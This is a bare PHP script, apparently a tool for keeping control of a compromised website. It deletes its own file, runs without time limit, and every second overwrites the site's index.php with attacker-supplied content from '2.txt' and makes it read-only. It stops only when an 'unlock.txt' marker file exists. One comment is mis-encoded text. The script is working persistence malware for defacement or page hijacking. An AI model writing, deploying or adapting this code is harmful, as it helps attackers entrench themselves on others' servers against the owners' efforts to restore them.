<?php
@unlink($_SERVER['SCRIPT_FILENAME']);
error_reporting(0);
ignore_user_abort(true);
set_time_limit(0);

$js = 'unlock.txt';
$mb = 'index.php';
$rn = '2.txt';
$nr = file_get_contents($rn);
@unlink($rn);


while (1==1) {
    
    if (file_exists($js)) {
        @unlink($js);
        exit();
    }
    else {
        @unlink($mb);
        chmod($mb, 0777);
        @unlink($mb);
        file_put_contents($mb, $nr); //Ëø¶¨ÄÚÈÝ //$fk = fopen($mb, w); fwrite($fk, $nr); fclose($fk);
        chmod($mb, 0444);  //
        usleep(1000000); //
    }
};
?>